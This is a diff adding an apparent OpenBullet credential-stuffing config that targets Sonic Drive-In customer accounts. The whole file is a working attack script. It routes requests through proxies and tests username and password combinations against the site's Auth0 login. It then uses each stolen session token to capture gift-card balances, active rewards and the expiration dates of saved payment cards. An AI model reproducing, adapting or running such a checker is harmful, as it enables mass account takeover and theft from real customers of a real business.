@@ -1,0 +1,158 @@
+[SETTINGS]
+{
+  "Name": "Sonic",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-04-18T00:58:06.9071577-04:00",
+  "AdditionalInfo": "",
+  "Author": "Aaron Kong | Privileged Owner#1680",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Love aaron he made the config :D",
+      "VariableName": "",
+      "Id": 1030882699
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://account.sonicdrivein.com/authorize?client_id=SQFWNVGOpuj1pxosM0Unu5xyIYdWLj4e&response_type=token&redirect_uri=https%3A%2F%2Fwww.sonicdrivein.com%2Fcallback&scope=openid&audience=https%3A%2F%2Fapi.sonicdrivein.digital%2Fweb-bff-prod&connection=dapi-connection&flow=login&state=CSvhqiJHSss1mc8Sqk_qR4h6cQ~GV4zj&auth0Client=eyJuYW1lIjoiYXV0aDAuanMiLCJ2ZXJzaW9uIjoiOS43LjMifQ%3D%3D" AutoRedirect=FALSE 
+  
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+
+#State PARSE "<SOURCE>" LR "login?state=" "&" -> VAR "State" 
+
+#Client PARSE "<SOURCE>" LR "&client=" "&" -> VAR "Client" 
+
+#AuthClient PARSE "<SOURCE>" LR "auth0Client=" "%" -> VAR "AuthClient" 
+
+#Loc PARSE "<HEADERS(Location)>" LR "" "" -> VAR "Loc" 
+
+#Post REQUEST GET "https://account.sonicdrivein.com<Loc>" 
+  
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Version/10.0 Mobile/14F89 Safari/602.1" 
+  HEADER "Pragma: no-cache" 
+
+PARSE "<COOKIES(_csrf)>" LR "" "" -> VAR "csrf" 
+
+#Exp REQUEST POST "https://account.sonicdrivein.com/usernamepassword/login" 
+  CONTENT "{\"client_id\":\"<Client>\",\"redirect_uri\":\"https://www.sonicdrivein.com/callback\",\"tenant\":\"sonicdrivein\",\"response_type\":\"token\",\"scope\":\"openid\",\"audience\":\"https://api.sonicdrivein.digital/web-bff-prod\",\"_csrf\":\"<csrf>\",\"state\":\"<State>\",\"_intstate\":\"deprecated\",\"password\":\"<PASS>\",\"connection\":\"dapi-connection\",\"username\":\"<USER>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Version/10.0 Mobile/14F89 Safari/602.1" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Auth0-Client: <AuthClient>==" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "invalid_user_password" 
+    KEY "missingPassword" 
+  KEYCHAIN Success OR 
+    KEY "https://account.sonicdrivein.com/login/callback" 
+
+#AuthClient2 PARSE "<SOURCE>" LR "auth0Client&#34;:&#34;" "=" -> VAR "AuthClient2" 
+
+#Session2 PARSE "<SOURCE>" LR "session_user&#34;:&#34;" "&" -> VAR "Session2" 
+
+#SID2 PARSE "<SOURCE>" LR "sid&#34;:&#34;" "&" -> VAR "SID2" 
+
+#State2 PARSE "<SOURCE>" LR "state&#34;:&#34;" "&" -> VAR "State2" 
+
+#Client2 PARSE "<SOURCE>" LR "client_id&#34;:&#34;" "&" -> VAR "Client2" 
+
+#Result2 PARSE "<SOURCE>" LR "value=\"e" "\"" -> VAR "Result2" "e" "" 
+
+#Call REQUEST POST "https://account.sonicdrivein.com/login/callback" AutoRedirect=FALSE 
+  CONTENT "wa=wsignin1.0&wresult=<Result2>&wctx=%7B%22strategy%22%3A%22auth0%22%2C%22auth0Client%22%3A%22<AuthClient2>%3D%3D%22%2C%22tenant%22%3A%22sonicdrivein%22%2C%22connection%22%3A%22dapi-connection%22%2C%22client_id%22%3A%22<Client2>%22%2C%22response_type%22%3A%22token%22%2C%22scope%22%3A%22openid%22%2C%22redirect_uri%22%3A%22https%3A%2F%2Fwww.sonicdrivein.com%2Fcallback%22%2C%22state%22%3A%22<State2>%22%2C%22sid%22%3A%22<SID2>%22%2C%22audience%22%3A%22https%3A%2F%2Fapi.sonicdrivein.digital%2Fweb-bff-prod%22%2C%22realm%22%3A%22dapi-connection%22%2C%22session_user%22%3A%22<Session2>%22%7D" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Version/10.0 Mobile/14F89 Safari/602.1" 
+  HEADER "Pragma: no-cache" 
+
+#Access PARSE "<SOURCE>" LR "access_token=" "&" -> VAR "Access" 
+
+#ForCapture REQUEST GET "https://api.sonicdrivein.digital/mobile-bff-prod/wallets/me/storedValueCards" 
+  
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Authorization: Bearer <Access>" 
+
+KEYCHECK 
+  KEYCHAIN Ban OR 
+    KEY "The page cannot be displayed. " 
+  KEYCHAIN Success OR 
+    KEY "<RESPONSECODE>" Contains "200" 
+
+#CardBalance PARSE "<SOURCE>" JSON "cardBalance" Recursive=TRUE -> VAR "CardBalance" 
+
+KEYCHECK 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "{\"storedValueCards\":[]}" 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "{\"storedValueCards\":[]}" 
+
+UTILITY List "CardBalance" Join "+" -> VAR "CardBalance" 
+
+FUNCTION Compute "<CardBalance>" -> CAP "CardBalance" 
+
+#ForCapture REQUEST GET "https://api.sonicdrivein.digital/mobile-bff-prod/rewards/active" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Bearer <Access>" 
+
+REQUEST GET "https://www.sonicdrivein.com/jsapi/v1/users/<ID>/payment_methods" 
+  
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+
+PARSE "<SOURCE>" LR "h\":" "," Recursive=TRUE -> CAP "CC Expiration Month" 
+
+PARSE "<SOURCE>" LR "r\":" "," Recursive=TRUE -> CAP "CC Expiration year" "20" "" 
+
